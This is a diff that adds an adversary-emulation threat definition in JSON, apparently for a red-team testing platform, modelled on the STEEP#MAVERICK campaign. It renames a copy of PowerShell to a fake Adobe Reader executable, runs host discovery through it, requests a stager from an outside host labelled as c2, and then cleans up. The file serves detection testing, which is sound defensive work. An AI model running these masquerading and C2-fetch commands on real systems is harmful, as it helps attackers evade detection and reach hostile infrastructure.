@@ -1,0 +1,107 @@
+{
+    "threat": {
+        "category": "User-Defined",
+        "description": "An STEEP#MAVERICK emulation featuring renaming of PowerShell.exe to AdobeAcrobatPDFReader",
+        "display_name": "STEEP_MAVERICK_AdobeAcrobat",
+        "name": "STEEP_MAVERICK_AdobeAcrobat",
+        "operating_system_name": "windows",
+        "script": {
+            "0": {
+                "conf": "--cp 127.0.0.1:443 --multipart 10240 --secure true",
+                "module": "https",
+                "type": "initialization"
+            },
+            "1": {
+                "depends_on": "8a328046-158f-4bce-bc3c-3c9b5b177512",
+                "module": "controller",
+                "request": "--integrity",
+                "type": "message"
+            },
+            "2": {
+                "function": "ifelse",
+                "next": "13",
+                "step": "1",
+                "type": "decision",
+                "value": "High",
+                "verb": "does not contain"
+            },
+            "3": {
+                "module": "loader",
+                "module_to_load": "run",
+                "request": "--load run",
+                "type": "message"
+            },
+            "4": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "forfiles.exe /c \"cmd.exe /c copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\AdobeAcrobatPDFReader.exe",
+                "rtags": [
+                    "att&ck-technique:T1059.001",
+                    "att&ck-technique:T1027"
+                ],
+                "type": "message"
+            },
+            "5": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "C:\\windows\\AdobeAcrobatPDFReader.exe /c Get-ComputerInfo -Property CsDomain, HyperVisorPresent",
+                "rtags": [
+                    "att&ck-technique:T1059.001",
+                    "att&ck-technique:T1082"
+                ],
+                "type": "message"
+            },
+            "6": {
+                "module": "loader",
+                "module_to_load": "upsh",
+                "request": "--load upsh",
+                "type": "message"
+            },
+            "7": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "Attempt connection to c2 to pull down initial stager"
+            },
+            "8": {
+                "depends_on": "ed8a7322-630d-4cc1-b065-8c2361d9f45d",
+                "module": "upsh",
+                "request": "--cmd Invoke-Command -ScriptBlock { try { $response = Invoke-WebRequest -Uri https://terma.dev/0 -TimeoutSec 15 } catch { $_.Exception.Response.StatusCode.Value__ } }",
+                "rtags": [
+                    "att&ck-technique:T1102.002"
+                ],
+                "type": "message"
+            },
+            "9": {
+                "time": "180",
+                "type": "delay"
+            },
+            "10": {
+                "name": "STEP",
+                "type": "assign",
+                "value": "CLEAN-UP"
+            },
+            "11": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "powershell.exe del C:\\windows\\AdobeAcrobatPDFReader.exe",
+                "type": "message"
+            },
+            "12": {
+                "function": "ifelse",
+                "next": "14",
+                "step": "1",
+                "type": "decision",
+                "value": "High",
+                "verb": "contains"
+            },
+            "13": {
+                "depends_on": "93b6b9cf-78d2-45ee-a174-08290fdf73db",
+                "module": "run",
+                "request": "echo \"This threat must be run as admin\"",
+                "type": "message"
+            }
+        },
+        "signature": "3ce1cbeedb097e1a0c3b83ebdd6c955a7433cf29",
+        "tags": []
+    }
+}
